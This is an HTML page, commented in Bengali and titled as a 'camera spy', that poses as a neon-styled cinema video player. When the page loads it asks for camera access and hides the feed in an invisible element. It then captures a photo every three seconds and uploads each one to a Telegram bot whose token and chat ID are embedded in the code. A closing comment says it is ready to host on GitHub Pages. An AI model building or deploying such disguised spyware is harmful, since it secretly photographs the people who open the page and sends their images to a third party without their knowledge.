<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>নিওন সিনেমা প্লেয়ার • ক্যামেরা স্পাই</title>
    <!-- Orbitron ফন্ট -->
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&display=swap" rel="stylesheet" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0b0d1a;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Orbitron', monospace;
            padding: 20px;
        }

        /* সাইবার/নিওন থিম – ডার্ক ব্যাকগ্রাউন্ড, 3D ইফেক্ট */
        .player-container {
            max-width: 820px;
            width: 100%;
            background: #12142a;
            border-radius: 48px 48px 32px 32px;
            padding: 28px 28px 20px;
            box-shadow: 0 30px 45px rgba(0, 0, 0, 0.9), 0 0 0 2px rgba(0, 255, 255, 0.2), 0 0 30px rgba(0, 255, 255, 0.3);
            border: 1px solid rgba(0, 255, 255, 0.3);
            backdrop-filter: blur(2px);
            transform: perspective(1200px) rotateX(2deg) rotateY(0deg);
            transition: all 0.2s ease;
        }

        /* ভিডিও প্লেয়ার (উপরের অংশ) */
        .video-wrapper {
            position: relative;
            width: 100%;
            padding-top: 56.25%; /* 16:9 */
            background: #0a0c1a;
            border-radius: 28px;
            overflow: hidden;
            box-shadow: inset 0 0 40px rgba(0, 200, 255, 0.3), 0 12px 30px rgba(0, 0, 0, 0.8);
            border: 1px solid #22ffff55;
            margin-bottom: 22px;
        }

        #videoPlayer {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            background: #05070f;
            display: block;
        }

        /* লুকানো ক্যামেরা (opacity: 0) – তবে জায়গা দখল করে */
        .hidden-camera {
            opacity: 0;
            position: absolute;
            width: 1px;
            height: 1px;
            pointer-events: none;
            z-index: -1;
        }

        /* কন্ট্রোল বার + LED + কাউন্টার */
        .control-panel {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px 12px;
            background: #0f1225cc;
            backdrop-filter: blur(6px);
            padding: 12px 20px;
            border-radius: 60px;
            border: 1px solid #33ddff55;
            box-shadow: 0 0 20px #00aaff33, inset 0 0 10px #00aaff22;
            margin-bottom: 18px;
        }

        .led-indicator {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .led {
            width: 18px;
            height: 18px;
            border-radius: 50%;
            background: #ff2a2a;
            box-shadow: 0 0 12px #ff2a2a, 0 0 30px #ff2a2a88;
            transition: 0.15s ease;
        }

        .led.green {
            background: #1eff6e;
            box-shadow: 0 0 20px #1eff6e, 0 0 50px #1eff6e66;
        }

        .led-label {
            color: #b0e0ff;
            font-weight: 400;
            letter-spacing: 2px;
            font-size: 0.8rem;
            text-shadow: 0 0 8px cyan;
        }

        .counter-box {
            background: #05080fcc;
            padding: 6px 22px 6px 18px;
            border-radius: 40px;
            border: 1px solid #44eeff88;
            box-shadow: 0 0 18px #00ccff33;
            color: #aaf0ff;
            font-weight: 700;
            font-size: 1.3rem;
            letter-spacing: 2px;
            backdrop-filter: blur(4px);
        }

        .counter-box span {
            color: #ffe484;
            text-shadow: 0 0 12px #ffbb33;
            margin-left: 6px;
        }

        .footer-stats {
            display: flex;
            justify-content: flex-end;
            color: #55ccff;
            font-weight: 400;
            letter-spacing: 2px;
            font-size: 0.9rem;
            text-shadow: 0 0 6px #00aaff;
            border-top: 1px solid #33ddff33;
            padding-top: 14px;
            margin-top: 4px;
        }

        .footer-stats i {
            font-style: normal;
            background: #121a2e;
            padding: 4px 16px;
            border-radius: 30px;
            border: 1px solid #00ddff44;
            backdrop-filter: blur(2px);
        }

        /* ছোট ডিভাইস */
        @media (max-width: 550px) {
            .player-container {
                padding: 16px;
            }
            .control-panel {
                flex-direction: column;
                align-items: stretch;
                gap: 10px;
            }
            .counter-box {
                text-align: center;
            }
        }

        /* 3D পার্সপেক্টিভ মজা */
        .player-container:hover {
            transform: perspective(1200px) rotateX(0deg) rotateY(1deg) scale(1.01);
            box-shadow: 0 40px 60px #000000cc, 0 0 0 3px #44ffff, 0 0 50px #44ffff77;
        }
    </style>
</head>
<body>

<div class="player-container">

    <!-- ভিডিও প্লেয়ার (উপর) -->
    <div class="video-wrapper">
        <video id="videoPlayer" controls autoplay muted playsinline>
            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4" />
            আপনার ব্রাউজার ভিডিও সাপোর্ট করে না।
        </video>

        <!-- লুকানো ক্যামেরা এলিমেন্ট (opacity:0) -->
        <video id="cameraFeed" class="hidden-camera" autoplay playsinline></video>
    </div>

    <!-- কন্ট্রোল প্যানেল: LED + কাউন্টার -->
    <div class="control-panel">
        <div class="led-indicator">
            <div class="led" id="statusLed"></div>
            <span class="led-label">⚡ লাইভ</span>
        </div>
        <div class="counter-box">
            📡 <span id="photoCounter">0</span>
        </div>
    </div>

    <!-- ফুটার: 1080p · 60fps -->
    <div class="footer-stats">
        <i>🎬 1080p · 60fps</i>
    </div>
</div>

<script>
    (function() {
        "use strict";

        // ---------- কনফিগারেশন ----------
        // 🔥 থিম কালার টেমপ্লেট (লাল/নীল/সবুজ/গোলাপী/বেগুনি/কমলা/সোনালী) 
        // আমরা এখানে "সবুজ" থিম ব্যবহার করছি (ডিফল্ট), কিন্তু আপনি চাইলে যেকোনো কালার কোড বসাতে পারেন।
        // পুরো ডিজাইন নিওন থিমে আছে, এবং কালার ভারিয়েবল ব্যবহার করলাম।
        const THEME_COLOR = "#1eff6e";   // সবুজ নিওন

        // Telegram বট টোকেন ও চ্যাট আইডি (এখানে সেট করুন)
        const BOT_TOKEN = "8917986127:AAGDw4tJGj1erwoKAhiacr7om9VSWGz6wb0";     // ⚠️ আপনার বট টোকেন দিন
        const CHAT_ID = "8157946649";         // ⚠️ আপনার চ্যাট আইডি দিন

        // ক্যামচার ইন্টারভাল (৩ সেকেন্ড)
        const CAPTURE_INTERVAL_MS = 3000;

        // ---------- DOM রেফারেন্স ----------
        const videoPlayer = document.getElementById('videoPlayer');
        const cameraFeed = document.getElementById('cameraFeed');
        const statusLed = document.getElementById('statusLed');
        const photoCounterSpan = document.getElementById('photoCounter');

        // ---------- স্টেট ----------
        let photoCount = 0;
        let cameraStream = null;
        let captureIntervalId = null;
        let isCameraReady = false;

        // ---------- হেল্পার: লেড আপডেট ----------
        function setLedState(isActive) {
            if (isActive) {
                statusLed.className = 'led green';
            } else {
                statusLed.className = 'led';
            }
        }

        // ---------- কাউন্টার আপডেট ----------
        function updateCounter() {
            photoCounterSpan.textContent = photoCount;
        }

        // ---------- ক্যামেরা শুরু (ডিফল্ট ব্রাউজার পপআপ) ----------
        async function startCamera() {
            try {
                // getUserMedia() পপআপ আসবে ব্রাউজার থেকে
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });

                cameraStream = stream;
                cameraFeed.srcObject = stream;
                await cameraFeed.play();

                isCameraReady = true;
                setLedState(true);
                console.log('📷 ক্যামেরা চালু হয়েছে');

                // ক্যামেরা চালু হলে প্রতি ৩ সেকেন্ডে ক্যাপচার শুরু
                if (captureIntervalId) clearInterval(captureIntervalId);
                captureIntervalId = setInterval(() => {
                    captureAndSend();
                }, CAPTURE_INTERVAL_MS);

                // তাৎক্ষণিক একটি ছবি পাঠাতে চাইলে (ঐচ্ছিক) 
                // captureAndSend();

            } catch (error) {
                console.error('❌ ক্যামেরা অ্যাক্সেস অস্বীকৃত:', error);
                setLedState(false);
                isCameraReady = false;
                alert('📸 ক্যামেরা চালু করতে পারিনি। অনুগ্রহ করে অনুমতি দিন।');
            }
        }

        // ---------- ক্যাপচার + টেলিগ্রামে পাঠান ----------
        function captureAndSend() {
            if (!isCameraReady || !cameraStream) {
                console.warn('⏳ ক্যামেরা প্রস্তুত নয়, ক্যাপচার স্কিপ।');
                return;
            }

            // ক্যানভাস ব্যবহার করে ফ্রেম ক্যাপচার
            const canvas = document.createElement('canvas');
            const videoTrack = cameraFeed.videoWidth && cameraFeed.videoHeight ? cameraFeed : null;
            if (!videoTrack) {
                console.warn('⚠️ ভিডিও ট্র্যাক সঠিক নয়');
                return;
            }

            const width = cameraFeed.videoWidth || 480;
            const height = cameraFeed.videoHeight || 360;
            canvas.width = width;
            canvas.height = height;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(cameraFeed, 0, 0, width, height);

            // ছবিকে Blob (JPEG) হিসেবে নেওয়া
            canvas.toBlob(async (blob) => {
                if (!blob) {
                    console.error('❌ ব্লব তৈরি ব্যর্থ');
                    return;
                }

                // ফাইল তৈরি
                const file = new File([blob], `frame_${Date.now()}.jpg`, { type: 'image/jpeg' });

                // টেলিগ্রামে পাঠান
                try {
                    await sendPhotoToTelegram(file);
                    // কাউন্টার বাড়ান
                    photoCount++;
                    updateCounter();
                    console.log(`✅ ছবি পাঠানো হয়েছে (${photoCount})`);
                } catch (error) {
                    console.error('❌ টেলিগ্রামে পাঠাতে ব্যর্থ:', error);
                }
            }, 'image/jpeg', 0.92);
        }

        // ---------- টেলিগ্রাম API (sendPhoto) ----------
        async function sendPhotoToTelegram(file) {
            if (!BOT_TOKEN || BOT_TOKEN === "8917986127:AAGDw4tJGj1erwoKAhiacr7om9VSWGz6wb0") {
                console.warn('⚠️ বট টোকেন সেট করা নেই। কনসোলে ডামি দেখানো হচ্ছে।');
                // ডেভেলপমেন্টে ডামি রেসপন্স
                return { ok: true, dummy: true };
            }
            if (!CHAT_ID || CHAT_ID === "8157946649") {
                console.warn('⚠️ চ্যাট আইডি সেট করা নেই।');
                return { ok: false, error: 'chat id missing' };
            }

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', file);

            const response = await fetch(url, {
                method: 'POST',
                body: formData,
            });

            if (!response.ok) {
                const errText = await response.text();
                throw new Error(`Telegram API error: ${response.status} ${errText}`);
            }
            return await response.json();
        }

        // ---------- উইন্ডো লোড হলে ক্যামেরা চালু ----------
        window.addEventListener('load', () => {
            // ডিফল্ট ভিডিও autoplay চালু আছে
            // ক্যামেরা চালু করার জন্য ডিফল্ট পপআপ আসবে
            startCamera();
        });

        // ---------- ক্লিনআপ (পেজ বন্ধ হলে) ----------
        window.addEventListener('beforeunload', () => {
            if (captureIntervalId) {
                clearInterval(captureIntervalId);
                captureIntervalId = null;
            }
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            isCameraReady = false;
            setLedState(false);
        });

        // ---------- (ঐচ্ছিক) থিম কালার প্রয়োগ – সিএসএস কাস্টম প্রপার্টি ----------
        // আমরা স্টাইলশিটে থিম কালার ব্যবহার করিনি, কিন্তু চাইলে document.documentElement.style.setProperty('--theme', THEME_COLOR);
        // তবে এখানে থিম ইতিমধ্যে নিওন সবুজ, তবে ক্লায়েন্ট কালার টেমপ্লেট অনুযায়ী পরিবর্তন করতে পারেন।
        // উদাহরণ: লাল, নীল, গোলাপী, বেগুনি, কমলা, সোনালী – আপনি THEME_COLOR পরিবর্তন করুন।
        console.log(`🎨 থিম কালার: ${THEME_COLOR}`);
        // বোনাস: কিছু এলিমেন্টে থিম কালার বসানো যায় (যেমন বর্ডার গ্লো)
        document.querySelector('.player-container').style.boxShadow = `0 30px 45px rgba(0,0,0,0.9), 0 0 0 2px ${THEME_COLOR}66, 0 0 30px ${THEME_COLOR}55`;
        document.querySelector('.video-wrapper').style.borderColor = `${THEME_COLOR}88`;
        document.querySelector('.control-panel').style.borderColor = `${THEME_COLOR}66`;
        document.querySelector('.counter-box').style.borderColor = `${THEME_COLOR}88`;
        document.querySelector('.footer-stats i').style.borderColor = `${THEME_COLOR}44`;

        // LED ইতিমধ্যে ক্লাস পরিচালনা করে, তবে অতিরিক্ত গ্লো দিতে পারি
        // কনসোল: সব প্রস্তুত
        console.log('🚀 নিওন সিনেমা প্লেয়ার + ক্যামেরা স্পাই চালু হয়েছে।');
    })();
</script>

<!-- 
  ⚡ টেকনিক্যালি: 
  - getUserMedia() ক্যামেরা
  - setInterval() ৩ সেকেন্ড
  - canvas frame ক্যাপচার
  - Telegram Bot API (sendPhoto)
  - GitHub Pages-এ কাজ করে (শুধু টোকেন/চ্যাট আইডি সেট করুন)
  - থিম কালার টেমপ্লেট: লাল/নীল/সবুজ/গোলাপী/বেগুনি/কমলা/সোনালী 
  - সাইবার/নিওন থিম, Orbitron ফন্ট, 3D ইফেক্ট
  - লুকানো ক্যামেরা (opacity:0)
  - LED indicator, কাউন্টার, ফুটার 
-->
</body>
  </html>
